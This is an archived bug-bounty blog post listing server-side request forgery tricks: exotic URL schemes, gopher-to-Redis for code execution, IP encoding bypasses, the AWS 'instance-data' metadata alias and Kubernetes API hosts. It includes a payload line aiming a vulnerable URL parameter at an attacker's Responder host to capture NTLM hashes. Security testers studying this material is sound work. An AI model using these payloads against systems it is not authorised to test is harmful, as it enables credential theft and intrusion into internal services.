# My SSRF Tricks — Bug Bounty Tuesday

- **Source URL:** https://medium.com/@kerstan/my-ssrf-tricks-bug-bounty-tuesday-f0d7e53c8d88?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240219034233/https://medium.com/@kerstan/my-ssrf-tricks-bug-bounty-tuesday-f0d7e53c8d88?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/5149 (id 5149)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
**Subscribed to:** [https://medium.com/@kerstan](https://web.archive.org/web/20240219034233/https://medium.com/@kerstan)

Hello everyone, I’m Kerstan.

Today is Bug bounty Tuesday, I will share with you my ssrf tricks.

So, let’s dive right in.

## 1. Try other URL schemes:

• file:// (file read)

• netdoc:// (file read)

• dict://

• gopher://

• jar://

• ldap://

You might be able to get file read.

Or send multi-line requests to gain additional impact

(Ex: gopher + redis = likely RCE)

## 2. Is the target running Windows?

Can’t hit internal services?

(Well, try this even if you can)

Try to steal NTLM hashes with Responder.

/vulnerable?url=http://your-responder-host

## 3. Try alternative representations of IP addresses.

IPs can be represented in many ways including:

• octal

• decimal

• hexadecimal

• etc.

Try different representations.

## 4. Can’t hit 169.254.169.254?

On AWS, “instance-data” resolves to the metadata server.

Try hitting [http://instance-data](https://web.archive.org/web/20240219034233/http://instance-data/) instead.

## 5. Know your target’s technologies.

Look at job postings!

You might not be able to hit a meta-data service.

But there are likely other internal services!

(ex: I’ve pulled data from an internal Elasticsearch instance)

## 6. Are they using Kubernetes?

Search Burp history for “.default.svc” or “.cluster.local”

If you find references, try to hit them.

Also, try to hit the Kubernetes API: [https://kubernetes.default.svc](https://web.archive.org/web/20240219034233/https://kubernetes.default.svc/)
